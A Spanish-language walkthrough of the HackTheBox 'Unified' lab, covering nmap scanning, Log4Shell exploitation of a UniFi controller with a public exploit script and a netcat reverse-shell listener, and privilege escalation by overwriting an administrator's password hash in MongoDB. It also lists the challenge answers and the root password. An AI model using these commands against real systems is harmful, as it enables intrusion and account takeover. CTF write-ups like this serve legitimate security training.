---

---
1)¿Cuáles son los cuatro primeros puertos abiertos?
	22,6789,8080,8443

2)¿Cuál es el título del software que se está ejecutando en el puerto 8443?
	UniFi Network
	Salio del escaneo de nmap

3)¿Cuál es la versión del software que se está ejecutando?
	6.4.54
	![[Unified3.png]]

4)¿Cuál es el CVE de la vulnerabilidad identificada?
	CVE-2021-44228
	[Github donde esta el CVE](https://github.com/puzzlepeaches/Log4jUnifi)

5)¿Qué protocolo utiliza JNDI en la inyección?
	LDAP
	LDAP (Lightweight Directory Access Protocol) es un protocolo que permite acceder y administrar información organizada en forma jerárquica, como usuarios, grupos y dispositivos de red.  
	Se usa principalmente para autenticación y gestión de identidades en redes empresariales.  
	No usa SQL y está diseñado para consultas rápidas sobre datos estructurados tipo directorio.


6)¿Qué herramienta utilizamos para interceptar el tráfico que indica que el ataque ha tenido éxito?
	[[tcpdump]]

7)¿Para qué puerto necesitamos inspeccionar el tráfico interceptado?
	389

8)¿En qué puerto se ejecuta el servicio MongoDB?
	27117

9)¿Cuál es el nombre predeterminado de la base de datos para las aplicaciones UniFi?
	ace
	![[Unified9.png]]
	Es la ace por que es la unica que tiene peso

10)¿Cuál es la función que utilizamos para enumerar usuarios dentro de la base de datos en [[mongodb]]?
	db.admin.find()

11)¿Cuál es la función que utilizamos para actualizar usuarios dentro de la base de datos en [[mongodb]]?
	db.admin.update()

12)¿Cuál es la contraseña del usuario root?
	NotACrackablePassword4U2022

-------

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.228.2
nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.228.2 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,6789,8080,8443,8843,8880 10.129.228.2 -oN target
```


![[Unified1.png]]
![[Unified2.png]]
*TTL:* Maquina linux
*Puertos:*
`22`SSH
`8080` Es un http
`6789, 8443, 8843, 8880` Estos todavia no sabemos para que son

--------
# CVE [[CVE-2021-44228]]

Cuando entramos al puerto 8080 que dice que es un http, nos redirigue a esta pagina
![[Unified4.png]]

[Link del CVE](https://github.com/puzzlepeaches/Log4jUnifi), Hicimos la instalacion que esta en el github
Ejecutamos el exploit ``python3 exploit.py -u https://10.129.228.2:8443 -i 10.10.16.17 -p 443`` estando en escucha con [[nc -nlvp 443]]

![[Unified5.png]]

![[Unified6.png]]

------
# [[Tratamiento de la TTY]]

---
# Escalada de privilegios

```
ps aux | grep mongod
```

![[Unified7.png]]

Vemos que esta corriendo en el puerto 27117

Nos conectamos con ``mongo --port 27117``
![[Unified8.png]]

Para ver las bases de datos `show dbs` y despues usamos la base de datos "ace" que es la unica que tiene contenido por el peso con `use ace`
Usamos comando ``db.admin.find()`` 
	**`admin` no es una colección por defecto**, sino una base de datos especial que contiene usuarios y configuraciones administrativas.
![[Unified11.png]]
```
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."
```
Nos da la contraseña hasheada pero no se puede crackear


Entonces vamos a cambiar la contraseña del usuario administrator
Esa contraseña como empieza por $6 sabemos que es SHA-512 asi que creamos una nueva con [[mkpasswd]] ``mkpasswd -m sha-512 test123``

![[Unified12.png]]

``$6$sP2utyIhNX7e0kit$4ysm601QjS5IGZ50Ccru1AcaZ.BdiK96RBSyIweWoLewf7PY7Pf1cfyZbB7GjH5XUIUJFHJyU2UPcCDS3lDnU.`` Esta es nuestra contraseña hasheada

```
db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$sP2utyIhNX7e0kit$4ysm601QjS5IGZ50Ccru1AcaZ.BdiK96RBSyIweWoLewf7PY7Pf1cfyZbB7GjH5XUIUJFHJyU2UPcCDS3lDnU."}})
```

Ya esta cambiada la contraseña, ahora vamos a ingregar con las credenciales `administrator` y `test123`
![[Unified13.png]]


![[Unified14.png]]
En esta parte nos da la contraseña del usuario root `NotACrackablePassword4U2022` y nos podemos conectar por ssh

![[Unified15.png]]
Una vez dentro podemos ya podemos catear las flags

Las flags estan en /home/michaels/user.txt y /root/root.txt



--------
# Notas
Puerto 8080 es una variante para el puerto 80
Mongodb se llama la base de datos pero mongod es el demonio corriendo el proceso

`db.admin.find()` solo funcionaría si vos (o alguien) creaste una colección llamada `admin`, y no tiene relación con ver usuarios o permisos administrativos en MongoDB.

SHA-512Es **SHA-512** porque el hash empieza con `$6$`, que es el identificador estándar usado por la función `crypt()` en Linux para indicar el uso de SHA-512.
[Pagina para ver tipos de hashes](https://hashes.com/en/tools/hash_identifier)


--------
# Creditos
Writeup Oficial HackTheBox
Writeup [Datalife](https://thedatalife.com/hack-the-box-unified)


